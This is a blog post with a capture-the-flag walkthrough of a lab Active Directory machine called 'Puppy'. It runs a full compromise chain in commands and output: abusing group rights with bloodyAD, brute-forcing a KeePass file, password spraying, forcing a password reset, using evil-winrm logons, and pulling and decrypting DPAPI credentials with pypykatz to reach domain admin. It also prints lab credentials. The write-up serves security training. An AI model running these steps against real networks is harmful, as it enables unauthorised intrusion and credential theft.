---
layout: post
title: "puppy"
date: 2025-10-27 
categories: CTF
---
# puppy

# Summary

- valid domain account to enumerate AD
- bloodhound-python to map AD
- GenericWrite over Developers group; bloodyAD to add ourself to group
- Read access to smb DEV share; download keepass file
- download latest version of keepass2johon; keepass version 4.x; [keepass4brute.sh](http://keepass4brute.sh) to crack the master password
- reveal credentials; nxc to get password policy; no lockout policy; bruteforce to find matching credential; ant.edwards owned
- bloodhound to reveal ant.edwards part of senior developers, which have GenericAll over adam.silver
- adam.silver is a disabled account; GenericAll to enable account with bloodyAD; ForceChangePassword on adam.silver
- adam.silver part of remote management group; logon to find backup zip file in C:\; download backup file
- unzip to reveal password in a xml file; steph.cooper; also part of remote management users
- evil-winrm to logon; download DPAPI master keys and Credentials blob; decrypt with pypykatz
- valid password for domain admin steph.cooper_adm

# Attack Path

Enumerate the open ports and services:

```bash
sudo nmap -sC -sV -oN nmap/puppy 10.10.11.70

53/tcp   open  domain        Simple DNS Plus
88/tcp   open  kerberos-sec  Microsoft Windows Kerberos (server time: 2025-10-28 00:27:20Z)
111/tcp  open  rpcbind       2-4 (RPC #100000)
| rpcinfo:
|   program version    port/proto  service
|   100000  2,3,4        111/tcp   rpcbind
|   100000  2,3,4        111/tcp6  rpcbind
|   100000  2,3,4        111/udp   rpcbind
|   100000  2,3,4        111/udp6  rpcbind
|   100003  2,3         2049/udp   nfs
|   100003  2,3         2049/udp6  nfs
|   100005  1,2,3       2049/udp   mountd
|   100005  1,2,3       2049/udp6  mountd
|   100021  1,2,3,4     2049/tcp   nlockmgr
|   100021  1,2,3,4     2049/tcp6  nlockmgr
|   100021  1,2,3,4     2049/udp   nlockmgr
|   100021  1,2,3,4     2049/udp6  nlockmgr
|   100024  1           2049/tcp   status
|   100024  1           2049/tcp6  status
|   100024  1           2049/udp   status
|_  100024  1           2049/udp6  status
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: PUPPY.HTB0., Site: Default-First-Site-Name)
445/tcp  open  microsoft-ds?
464/tcp  open  kpasswd5?
593/tcp  open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp  open  tcpwrapped
2049/tcp open  nlockmgr      1-4 (RPC #100021)
3260/tcp open  iscsi?
3268/tcp open  ldap          Microsoft Windows Active Directory LDAP (Domain: PUPPY.HTB0., Site: Default-First-Site-Name)
3269/tcp open  tcpwrapped
5985/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
Service Info: Host: DC; OS: Windows; CPE: cpe:/o:microsoft:windows

```

Let’s add the domain name and DC host to our /etc/hosts file:

```bash
10.10.11.70 puppy.htb dc.puppy.htb
```

## Active Directory Enumeration

We also get a valid domain account:

```bash
levi.james:KingofAkron2025!
```

Let’s enumerate this user’s rights:

```bash
nxc smb 10.10.11.70 -u levi.james -p 'KingofAkron2025!' --shares

SMB         10.10.11.70     445    DC               Share           Permissions     Remark
SMB         10.10.11.70     445    DC               -----           -----------     ------
SMB         10.10.11.70     445    DC               ADMIN$                          Remote Admin
SMB         10.10.11.70     445    DC               C$                              Default share
SMB         10.10.11.70     445    DC               DEV                             DEV-SHARE for PUPPY-DEVS
SMB         10.10.11.70     445    DC               IPC$            READ            Remote IPC
SMB         10.10.11.70     445    DC               NETLOGON        READ            Logon server share 
SMB         10.10.11.70     445    DC               SYSVOL          READ            Logon server share
```

Let’s see what’s in the NETLOGON share:

```bash
nxc smb 10.10.11.70 -u levi.james -p 'KingofAkron2025!' --spider NETLOGON --regex .
```

Nothing. Let’s map out the AD now and check our privileges:

```bash
bloodhound-python -u levi.james -p 'KingofAkron2025!' -ns 10.10.11.70 -d puppy.htb -c all
```

Now, let’s start bloodhound and upload our json files.

![image.png]({{ site.baseurl }}/assets/puppy/image.png)

We are a member of HR, which have GenericWrite over Developers. This allows us to add our user to the Developers group.

```bash
bloodyAD -u 'levi.james' -p 'KingofAkron2025!' -d puppy.htb --host 10.10.11.70 add groupMember 'Developers' levi.james

[+] levi.james added to Developers
```

Now let’s check our SMB shares again:

```bash
nxc smb 10.10.11.70 -u levi.james -p 'KingofAkron2025!' --shares

SMB         10.10.11.70     445    DC               Share           Permissions     Remark
SMB         10.10.11.70     445    DC               -----           -----------     ------
SMB         10.10.11.70     445    DC               ADMIN$                          Remote Admin
SMB         10.10.11.70     445    DC               C$                              Default share
SMB         10.10.11.70     445    DC               DEV             READ            DEV-SHARE for PUPPY-DEVS
SMB         10.10.11.70     445    DC               IPC$            READ            Remote IPC
SMB         10.10.11.70     445    DC               NETLOGON        READ            Logon server share 
SMB         10.10.11.70     445    DC               SYSVOL          READ            Logon server share 
```

We now have read permission. Let’s check out what files are in the share:

```bash
nxc smb 10.10.11.70 -u levi.james -p 'KingofAkron2025!' --spider DEV --regex . 

SMB         10.10.11.70     445    DC               //10.10.11.70/DEV/KeePassXC-2.7.9-Win64.msi [lastm:'2025-03-23 03:09' size:34394112]
SMB         10.10.11.70     445    DC               //10.10.11.70/DEV/Projects [dir]
SMB         10.10.11.70     445    DC               //10.10.11.70/DEV/recovery.kdbx [lastm:'2025-03-11 22:25' size:2677]

```

Let’s download the keepass file:

```bash
nxc smb 10.10.11.70 -u levi.james -p 'KingofAkron2025!' --share DEV --get-file recovery.kdbx recovery.kdbx
```

## Lateral Movement

The .kdbx file is password protected. Let’s crack it with john. First, convert the format to john hashes. Download the latest version of keepass2john and execute the following:

```bash
python keepass2john.py recovery.kdbx > recovery.hashes

recovery.kdbx:$keepass$*4*37*ef636ddf*67108864*19*4*bf70d9925723ccf623575d62e4c4fb590a2b2b4323ac35892cf2662853527714*d421b15d6c79e29ecb70c8e1c2e92b4b27dc8d9ae6d8107292057feb92441470*03d9a29a67fb4bb500000400021000000031c1f2e6bf714350be5805216afc5aff0304000000010000000420000000bf70d9925723ccf623575d62e4c4fb590a2b2b4323ac35892cf266285352771407100000000ab56ae17c5cebf440092907dac20a350b8b00000000014205000000245555494410000000ef636ddf8c29444b91f7a9a403e30a0c05010000004908000000250000000000000005010000004d080000000000000400000000040100000050040000000400000042010000005320000000d421b15d6c79e29ecb70c8e1c2e92b4b27dc8d9ae6d8107292057feb9244147004010000005604000000130000000000040000000d0a0d0a*31614848015626f2451cc4d07ce9a281a416c8e8c2ff8cc45c69ce1f4daef0e9
```

Now let’s crack it with hashcat; only keep the part after the `:` 

```bash
.\john.exe --wordlist=..\..\rockyou.txt ..\..\hashes.txt
```

```bash
.\hashcat.exe -m 13400 ..\hashes.txt ..\rockyou.txt --show
```

john and hashcat are both not working. Found this tool to bruteforce, luckily the password is near the start of the rockyou.txt list:

[https://github.com/r3nt0n/keepass4brute/blob/master/keepass4brute.sh](https://github.com/r3nt0n/keepass4brute/blob/master/keepass4brute.sh)

```bash
./keepass4brute.sh recovery.kdbx /usr/share/wordlists/rockyou.txt

liverpool
```

Let’s unlock:

```bash
keepassxc recovery.kdbx
```

```bash
Jamie Williamson:JamieLove2025! ---- M
Adam Silver:HJKL2025! ---- T
ANTONY C. EDWARDS:Antman2025!  ---- F
Steve Tucker: Steve2025!  ---- F
Samuel Blake:ILY2025! ----- F
```

The most interesting user here is Adam Silver, as he’s part of the remote management users group, which means we can log on via evil-winrm.

![image.png]({{ site.baseurl }}/assets/puppy/image%201.png)

Let’s check the validity of the password and if there are any additional privileges to read/write shares:

```bash
nxc smb 10.10.11.70 -u adam.silver -p 'HJKL2025!' --shares

SMB         10.10.11.70     445    DC               [-] PUPPY.HTB\adam.silver:HJKL2025! STATUS_LOGON_FAILURE 
```

Let’s try Jamie:

```bash
nxc smb 10.10.11.70 -u jamie.williams -p 'JamieLove2025!' --shares

SMB         10.10.11.70     445    DC               [-] PUPPY.HTB\jamie.williams:JamieLove2025! STATUS_LOGON_FAILURE
```

Let’s just try all the credentials, matching them with each other until one matches. First, let’s check the password policy, to make sure we do not lock out any accounts.

```bash
nxc smb 10.10.11.70 -u levi.james -p 'KingofAkron2025!' --pass-pol

SMB         10.10.11.70     445    DC               Minimum password length: 7
SMB         10.10.11.70     445    DC               Password history length: 24
SMB         10.10.11.70     445    DC               Maximum password age: 41 days 23 hours 53 minutes 
SMB         10.10.11.70     445    DC               
SMB         10.10.11.70     445    DC               Password Complexity Flags: 000001
SMB         10.10.11.70     445    DC                   Domain Refuse Password Change: 0
SMB         10.10.11.70     445    DC                   Domain Password Store Cleartext: 0
SMB         10.10.11.70     445    DC                   Domain Password Lockout Admins: 0
SMB         10.10.11.70     445    DC                   Domain Password No Clear Change: 0
SMB         10.10.11.70     445    DC                   Domain Password No Anon Change: 0
SMB         10.10.11.70     445    DC                   Domain Password Complex: 1
SMB         10.10.11.70     445    DC               
SMB         10.10.11.70     445    DC               Minimum password age: 1 day 4 minutes 
SMB         10.10.11.70     445    DC               Reset Account Lockout Counter: 30 minutes 
SMB         10.10.11.70     445    DC               Locked Account Duration: 30 minutes 
SMB         10.10.11.70     445    DC               Account Lockout Threshold: None
SMB         10.10.11.70     445    DC               Forced Log off Time: Not Set

```

 We see that `Account Lockout Threshold: None` . There are no lockout policies. 

Let’s get a full list of usernames. We can do that with `—users` flag:

```bash
nxc smb 10.10.11.70 -u levi.james -p 'KingofAkron2025!' --users

SMB         10.10.11.70     445    DC               Administrator                 2025-02-19 19:33:28 0       Built-in account for administering the computer/domain
SMB         10.10.11.70     445    DC               Guest                         <never>             0       Built-in account for guest access to the computer/domain
SMB         10.10.11.70     445    DC               krbtgt                        2025-02-19 11:46:15 0       Key Distribution Center Service Account
SMB         10.10.11.70     445    DC               levi.james                    2025-02-19 12:10:56 0        
SMB         10.10.11.70     445    DC               ant.edwards                   2025-02-19 12:13:14 0        
SMB         10.10.11.70     445    DC               adam.silver                   2025-10-28 01:34:29 6        
SMB         10.10.11.70     445    DC               jamie.williams                2025-02-19 12:17:26 6        
SMB         10.10.11.70     445    DC               steph.cooper                  2025-02-19 12:21:00 0        
SMB         10.10.11.70     445    DC               steph.cooper_adm              2025-03-08 15:50:40 0
```

Format it, then put it into a file:

```bash
awk '{print $5}' users.txt > valid_users.txt
```

Now create our passwords list:

```bash
JamieLove2025!
HJKL2025!
Antman2025!
ILY2025!
Steve2025!
```

```bash
nxc smb 10.10.11.70 -u valid_users.txt -p pwds.txt 

SMB         10.10.11.70     445    DC               [+] PUPPY.HTB\ant.edwards:Antman2025! 
```

Let’s check out ant.edwards’ privileges:

![image.png]({{ site.baseurl }}/assets/puppy/image%202.png)

We are part of Senior Devs group.

![image.png]({{ site.baseurl }}/assets/puppy/image%203.png)

Which have GenericAll over adam.silver.

We can perform Force Change Password on adam, then login onto the DC via evil-winrm. 

```bash
bloodyAD --host dc.puppy.htb -d puppy.htb -u ant.edwards -p 'Antman2025!' set password adam.silver 'qwe1234!'

[+] Password changed successfully!
```

Let’s quickly enumerate permissions:

```bash
nxc smb 10.10.11.70 -u adam.silver -p 'qwe1234!' 

SMB         10.10.11.70     445    DC               [-] PUPPY.HTB\adam.silver:qwe1234! STATUS_ACCOUNT_DISABLED 
```

Let’s enable the account, we can do this since we have GenericAll privilege.

```bash
bloodyAD -d puppy.htb -u ant.edwards -p 'Antman2025!' --host dc.puppy.htb -k remove uac adam.silver -f ACCOUNTDISABLE

[-] ['ACCOUNTDISABLE'] property flags removed from adam.silver's userAccountControl

#if clock skew error:
sudo ntpdate 10.10.11.70

```

Now, let’s change the password again, and verify rights:

```bash
bloodyAD --host dc.puppy.htb -d puppy.htb -u ant.edwards -p 'Antman2025!' set password adam.silver 'qwe1234!'

[+] Password changed successfully!

nxc smb 10.10.11.70 -u adam.silver -p 'qwe1234!' --shares

SMB         10.10.11.70     445    DC               [+] PUPPY.HTB\adam.silver:qwe1234! 
SMB         10.10.11.70     445    DC               [*] Enumerated shares
SMB         10.10.11.70     445    DC               Share           Permissions     Remark
SMB         10.10.11.70     445    DC               -----           -----------     ------
SMB         10.10.11.70     445    DC               ADMIN$                          Remote Admin
SMB         10.10.11.70     445    DC               C$                              Default share
SMB         10.10.11.70     445    DC               DEV             READ            DEV-SHARE for PUPPY-DEVS
SMB         10.10.11.70     445    DC               IPC$            READ            Remote IPC
SMB         10.10.11.70     445    DC               NETLOGON        READ            Logon server share 
SMB         10.10.11.70     445    DC               SYSVOL          READ            Logon server share 
```

Let’s try to log on:

```bash
evil-winrm -i 10.10.11.70 -u adam.silver -p 'qwe1234!'
```

![image.png]({{ site.baseurl }}/assets/puppy/image%204.png)

We are on. We have no additional privileges.

Let’s check for easy wins. First, stored creds:

```bash
cmdkey /list
```

None.

Let’s check our powershell history:

```bash
type C:\Users\adam.silver\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
```

None. We go to the C:\ drive at home. We find a backup zip file. Let’s download it back to our host:

```bash
download site-backup-2024-12-30.zip
```

We unzip the file and we find a nms-auth-config.xml.bak:

```bash
<?xml version="1.0" encoding="UTF-8"?>
<ldap-config>
    <server>
        <host>DC.PUPPY.HTB</host>
        <port>389</port>
        <base-dn>dc=PUPPY,dc=HTB</base-dn>
        <bind-dn>cn=steph.cooper,dc=puppy,dc=htb</bind-dn>
        <bind-password>ChefSteph2025!</bind-password>
    </server>
    <user-attributes>
        <attribute name="username" ldap-attribute="uid" />
        <attribute name="firstName" ldap-attribute="givenName" />
        <attribute name="lastName" ldap-attribute="sn" />
        <attribute name="email" ldap-attribute="mail" />
    </user-attributes>
    <group-attributes>
        <attribute name="groupName" ldap-attribute="cn" />
        <attribute name="groupMember" ldap-attribute="member" />
    </group-attributes>
    <search-filter>
        <filter>(&(objectClass=person)(uid=%s))</filter>
    </search-filter>
</ldap-config>

```

We get a set of credential:

```bash
steph.cooper:ChefSteph2025!
```

Let’s check their privileges:

![image.png]({{ site.baseurl }}/assets/puppy/image%205.png)

Nothing too interesting. But a user with the same name with _adm is the domain admin:

![image.png]({{ site.baseurl }}/assets/puppy/image%206.png)

Let’s verify the password and see if the password is reused:

```bash
nxc smb 10.10.11.70 -u steph.cooper -p ChefSteph2025! --shares

SMB         10.10.11.70     445    DC               [+] PUPPY.HTB\steph.cooper:ChefSteph2025! 
SMB         10.10.11.70     445    DC               [*] Enumerated shares
SMB         10.10.11.70     445    DC               Share           Permissions     Remark
SMB         10.10.11.70     445    DC               -----           -----------     ------
SMB         10.10.11.70     445    DC               ADMIN$                          Remote Admin
SMB         10.10.11.70     445    DC               C$                              Default share
SMB         10.10.11.70     445    DC               DEV                             DEV-SHARE for PUPPY-DEVS
SMB         10.10.11.70     445    DC               IPC$            READ            Remote IPC
SMB         10.10.11.70     445    DC               NETLOGON        READ            Logon server share 
SMB         10.10.11.70     445    DC               SYSVOL          READ            Logon server share 
```

```bash
nxc smb 10.10.11.70 -u steph.cooper_adm -p ChefSteph2025! --shares

SMB         10.10.11.70     445    DC               [-] PUPPY.HTB\steph.cooper_adm:ChefSteph2025! STATUS_LOGON_FAILURE 
```

Nope. 

## Privilege Escalation

Let’s logon as steph cooper:

```bash
evil-winrm -i 10.10.11.70 -u steph.cooper -p ChefSteph2025!
```

![image.png]({{ site.baseurl }}/assets/puppy/image%207.png)

```bash
type C:\Users\steph.cooper\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
```

Nothing. 

We can scour DPAPI. 

```bash
ls -force

    Directory: C:\Users\steph.cooper\Appdata\Roaming\Microsoft\Credentials

Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
-a-hs-          3/8/2025   7:54 AM            414 C8D69EBE9A43E9DEBF6B5FBD48B521B9

```

Our download function is blocked. Let’s convert it to base64 then decode it on our host:

```bash
[Convert]::ToBase64String([IO.File]::ReadAllBytes("$(pwd)\C8D69EBE9A43E9DEBF6B5FBD48B521B9"))
```

```bash
echo 'AQAAAJIBAAAAAAAAAQAAANCMnd8BFdERjHoAwE/Cl+sBAAAAEiRqVXUSz0y3IeagtPkEBwAAACA6AAAARQBuAHQAZQByAHAAcgBpAHMAZQAgAEMAcgBlAGQAZQBuAHQAaQBhAGwAIABEAGEAdABhAA0ACgAAAANmAADAAAAAEAAAAHEb7RgOmv+9Na4Okf93s5UAAAAABIAAAKAAAAAQAAAACtD/ejPwVzLZOMdWJSHNcNAAAAAxXrMDYlY3P7k8AxWLBmmyKBrAVVGhfnfVrkzLQu2ABNeu0R62bEFJ0CdfcBONlj8Jg2mtcVXXWuYPSiVDse/sOudQSf3ZGmYhCz21A8c6JCGLjWuS78fQnyLW5RVLLzZp2+6gEcSU1EsxFdHCp9cT1fHIHl0cXbIvGtfUdeIcxPq/nN5PY8TR3T8i7rw1h5fEzlCX7IFzIu0avyGPnrIDNgButIkHWX+xjrzWKXGEiGrMkbgiRvfdwFxb/XrET9Op8oGxLkI6Mr8QmFZbjS41FAAAADqxkFzw7vbQSYX1LftJiaf2waSc' | base64 -d > C8D69EBE9A43E9DEBF6B5FBD48B521B9
```

Now verify:

```bash
#on target
Get-FileHash -Algorithm MD5 C8D69EBE9A43E9DEBF6B5FBD48B521B9

#on attack
md5sum C8D69EBE9A43E9DEBF6B5FBD48B521B9
```

![image.png]({{ site.baseurl }}/assets/puppy/image%208.png)

Let’s now download the encrypted master key:

```bash
cd "C:\Users\steph.cooper\Appdata\Roaming\Microsoft\Protect\S-1-5-21-1487982659-1829050783-2281216199-1107"

ls -force
```

![image.png]({{ site.baseurl }}/assets/puppy/image%209.png)

There is only one key here. Let’s download that:

```bash
[Convert]::ToBase64String([IO.File]::ReadAllBytes("$(pwd)\556a2412-1275-4ccf-b721-e6a0b4f90407"))

AgAAAAAAAAAAAAAANQA1ADYAYQAyADQAMQAyAC0AMQAyADcANQAtADQAYwBjAGYALQBiADcAMgAxAC0AZQA2AGEAMABiADQAZgA5ADAANAAwADcAAABqVXUSz0wAAAAAiAAAAAAAAABoAAAAAAAAAAAAAAAAAAAAdAEAAAAAAAACAAAAsj8xITRBgEgAZOArghULmlBGAAAJgAAAA2YAAPtTG5NorNzxhcfx4/jYgxj+JK0HBHMu8jL7YmpQvLiX7P3r8JgmUe6u9jRlDDjMOHDoZvKzrgIlOUbC0tm4g/4fwFIfMWBq0/fLkFUoEUWvl1/BQlIKAYfIoVXIhNRtc+KnqjXV7w+BAgAAAIIHeThOAhE+Lw/NTnPdszJQRgAACYAAAANmAAAnsQrcWYkrgMd0xLdAjCF9uEuKC2mzsDC0a8AOxgQxR93gmJxhUmVWDQ3j7+LCRX6JWd1L/NlzkmxDehild6MtoO3nd90f5dACAAAAAAEAAFgAAADzFsU+FoA2QrrPuakOpQmSSMbe5Djd8l+4J8uoHSit4+e1BHJIbO28uwtyRxl2Q7tk6e/jjlqROSxDoQUHc37jjVtn4SVdouDfm52kzZT2VheO6A0DqjDlEB19Qbzn9BTpGG4y7P8GuGyN81sbNoLN84yWe1mA15CSZPHx8frov6YwdLQEg7H8vyv9ZieGhBRwvpvp4gTur0SWGamc7WN590w8Vp98J1n3t3TF8H2otXCjnpM9m6exMiTfWpTWfN9FFiL2aC7Gzr/FamzlMQ5E5QAnk63b2T/dMJnp5oIU8cDPq+RCVRSxcdAgUOAZMxPs9Cc7BUD+ERVTMUi/Jp7MlVgK1cIeipAl/gZz5asyOJnbThLa2ylLAf0vaWZGPFQWaIRfc8ni2iVkUlgCO7bI9YDIwDyTGQw0Yz/vRE/EJvtB4bCJdW+Ecnk8TUbok3SGQoExL3I5Tm2a/F6/oscc9YlciWKEmqQ=
```

```bash
#on attack
echo 'AgAAAAAAAAAAAAAANQA1ADYAYQAyADQAMQAyAC0AMQAyADcANQAtADQAYwBjAGYALQBiADcAMgAxAC0AZQA2AGEAMABiADQAZgA5ADAANAAwADcAAABqVXUSz0wAAAAAiAAAAAAAAABoAAAAAAAAAAAAAAAAAAAAdAEAAAAAAAACAAAAsj8xITRBgEgAZOArghULmlBGAAAJgAAAA2YAAPtTG5NorNzxhcfx4/jYgxj+JK0HBHMu8jL7YmpQvLiX7P3r8JgmUe6u9jRlDDjMOHDoZvKzrgIlOUbC0tm4g/4fwFIfMWBq0/fLkFUoEUWvl1/BQlIKAYfIoVXIhNRtc+KnqjXV7w+BAgAAAIIHeThOAhE+Lw/NTnPdszJQRgAACYAAAANmAAAnsQrcWYkrgMd0xLdAjCF9uEuKC2mzsDC0a8AOxgQxR93gmJxhUmVWDQ3j7+LCRX6JWd1L/NlzkmxDehild6MtoO3nd90f5dACAAAAAAEAAFgAAADzFsU+FoA2QrrPuakOpQmSSMbe5Djd8l+4J8uoHSit4+e1BHJIbO28uwtyRxl2Q7tk6e/jjlqROSxDoQUHc37jjVtn4SVdouDfm52kzZT2VheO6A0DqjDlEB19Qbzn9BTpGG4y7P8GuGyN81sbNoLN84yWe1mA15CSZPHx8frov6YwdLQEg7H8vyv9ZieGhBRwvpvp4gTur0SWGamc7WN590w8Vp98J1n3t3TF8H2otXCjnpM9m6exMiTfWpTWfN9FFiL2aC7Gzr/FamzlMQ5E5QAnk63b2T/dMJnp5oIU8cDPq+RCVRSxcdAgUOAZMxPs9Cc7BUD+ERVTMUi/Jp7MlVgK1cIeipAl/gZz5asyOJnbThLa2ylLAf0vaWZGPFQWaIRfc8ni2iVkUlgCO7bI9YDIwDyTGQw0Yz/vRE/EJvtB4bCJdW+Ecnk8TUbok3SGQoExL3I5Tm2a/F6/oscc9YlciWKEmqQ=' | base64 -d > 556a2412-1275-4ccf-b721-e6a0b4f90407
```

Now, let’s generate the prekeys:

```bash
pypykatz dpapi prekey password 'S-1-5-21-1487982659-1829050783-2281216199-1107' 'ChefSteph2025!' > prekey_file
```

Now let’s decrypt the master key:

```bash
pypykatz dpapi masterkey 556a2412-1275-4ccf-b721-e6a0b4f90407 prekey_file -o mkf
```

Now let’s decrypt Credentials:

```bash
pypykatz dpapi credential mkf C8D69EBE9A43E9DEBF6B5FBD48B521B9

type : DOMAIN_PASSWORD (2)
last_written : 133859228697062409
target : Domain:target=PUPPY.HTB
username : steph.cooper_adm
unknown4 : b'F\x00i\x00v\x00e\x00t\x00h\x00C\x00h\x00i\x00p\x00O\x00n\x00I\x00t\x00s\x00W\x00a\x00y\x002\x000\x002\x005\x00!\x00'

```

Convert to little endian format:

```bash
echo 'F\x00i\x00v\x00e\x00t\x00h\x00C\x00h\x00i\x00p\x00O\x00n\x00I\x00t\x00s\x00W\x00a\x00y\x002\x000\x002\x005\x00!\x00' | iconv -t utf-16le

FivethChipOnItsWay2025!
```

Let’s see if this works:

```bash
nxc smb 10.10.11.70 -u steph.cooper_adm -p FivethChipOnItsWay2025! --shares

SMB         10.10.11.70     445    DC               [+] PUPPY.HTB\steph.cooper_adm:FivethChipOnItsWay2025! (Pwn3d!)
SMB         10.10.11.70     445    DC               [*] Enumerated shares
SMB         10.10.11.70     445    DC               Share           Permissions     Remark
SMB         10.10.11.70     445    DC               -----           -----------     ------
SMB         10.10.11.70     445    DC               ADMIN$          READ,WRITE      Remote Admin
SMB         10.10.11.70     445    DC               C$              READ,WRITE      Default share
SMB         10.10.11.70     445    DC               DEV             READ,WRITE      DEV-SHARE for PUPPY-DEVS
SMB         10.10.11.70     445    DC               IPC$            READ            Remote IPC
SMB         10.10.11.70     445    DC               NETLOGON        READ,WRITE      Logon server share 
SMB         10.10.11.70     445    DC               SYSVOL          READ,WRITE      Logon server share 
```

We are now domain admin. Let’s logon:

```bash
evil-winrm -i 10.10.11.70 -u steph.cooper_adm -p FivethChipOnItsWay2025!
```

We are now administrator:

![image.png]({{ site.baseurl }}/assets/puppy/image%2010.png)